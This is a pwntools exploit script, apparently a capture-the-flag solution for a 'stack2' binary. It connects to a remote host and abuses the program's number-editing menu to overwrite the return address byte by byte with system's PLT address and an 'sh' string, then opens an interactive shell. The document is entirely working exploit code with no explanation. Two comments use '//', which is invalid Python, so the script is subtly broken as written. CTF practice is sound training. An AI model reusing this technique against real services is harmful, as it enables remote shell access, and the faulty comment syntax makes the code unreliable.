from pwn import *
#context.log_level = 'debug'

r = remote("220.249.52.133", 34088)
#r = process("./stack2")

r.recvuntil("How many numbers you have:\n")
r.sendline("1")
r.recvuntil("Give me your numbers\n")
r.sendline("1")

def change(addr, num):
    r.recvuntil("5. exit\n")
    r.sendline("3")
    r.recvuntil("which number to change:\n")
    r.sendline(str(addr))
    r.recvuntil("new number:\n")
    r.sendline(str(num))

change(0x84, 0x50)
change(0x85, 0x84)
change(0x86, 0x04)
change(0x87, 0x08)//system的plt地址
change(0x8c, 0x87)
change(0x8d, 0x89)
change(0x8e, 0x04)
change(0x8f, 0x08)//字符串"sh"的地址

r.sendline("5")

r.interactive()
